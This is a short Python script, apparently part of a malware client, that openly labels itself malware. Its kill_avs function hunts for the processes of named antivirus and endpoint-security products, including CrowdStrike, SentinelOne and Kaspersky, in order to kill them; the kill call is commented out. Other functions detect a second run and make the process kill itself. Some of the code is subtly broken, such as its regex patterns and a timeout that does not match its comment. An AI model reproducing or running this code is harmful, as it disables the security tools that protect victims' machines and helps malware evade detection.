#!/usr/bin/python3
import logging
import os
import signal
from time import sleep
import time

def get_pids(regex):
    cmd = f"ps -aef | grep -i -E '{regex}' | grep -v 'grep' | awk '{{ print $2 }}'" 
    output = os.popen(cmd).read()
    pids = output.replace('PID','').strip().split('\n')
    pids = [int(pid) for pid in pids if pid != '']    
    logging.info(f"Malware pids: {pids}")
    return pids

def kill_avs(avs: list = ['antivirus', 'kaspersky', 'norton', 'corwdstrike', 'deepinstinct', 'sentinelone', 'checkpoint', 'cybereason']):
    avs = [ f"{av}" for av in avs]
    logging.info(avs)
    for av in avs:
        pids = get_pids(av)
        logging.info(f"Check for: {av} found pids: {pids} killing processes...")
        for pid in get_pids(av):
            pass
            #os.kill(pid, signal.SIGKILL)

def check_parent():
    my_pid = os.getpid()
    print(my_pid)
    pids = get_pids('*mclient$')
    sleep(5)
    if len(pids) != 1:
        return True # malware secound run
    else:
        return False # malware first run
    
def self_kill():
    my_pid = os.getpid()
    timeout = time.time() + 1
    print("STRT SELF KILL")
    while time.time() < timeout: # no child in 60 sec
        if len(get_pids('*mclient$')) != 1: # have child
            print("Have Child, self kill")
            sleep(2)
            os.kill(my_pid, signal.SIGKILL)
            exit()